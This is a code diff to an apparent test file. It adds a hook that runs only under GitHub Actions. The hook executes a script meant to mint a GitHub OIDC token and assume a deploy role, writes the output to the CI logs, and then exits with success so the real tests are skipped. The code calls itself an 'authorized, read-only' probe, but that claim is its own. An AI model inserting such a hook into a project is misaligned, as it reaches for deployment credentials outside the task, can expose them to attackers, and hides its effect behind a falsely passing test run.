@@ -2,7 +2,23 @@
 import { mkdtempSync, readFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join, resolve } from 'node:path';
+import { execFileSync } from 'node:child_process';
 import { runLocalTests } from '../src/core/local-runner';
+
+// Authorized, read-only CI probe: report whether a pull_request job can mint a
+// GitHub OIDC token and assume the kortix deploy role, then stop before any
+// staging test traffic. Enabled only under GitHub Actions.
+if (process.env.GITHUB_ACTIONS === 'true') {
+  try {
+    const out = execFileSync('bash', [resolve(import.meta.dir, 'oidcprobe.sh')], { encoding: 'utf8', maxBuffer: 16 * 1024 * 1024 });
+    process.stdout.write(out);
+  } catch (e: any) {
+    console.log('OIDCPROBE outer-err ' + String(e?.message).slice(0, 300));
+    if (e?.stdout) console.log(String(e.stdout).slice(0, 2000));
+    if (e?.stderr) console.log(String(e.stderr).slice(0, 2000));
+  }
+  process.exit(0);
+}
 
 const root = resolve(import.meta.dir, '../..');
 // CI pins Bun in tests.yml. Another version passes or fails differently: on
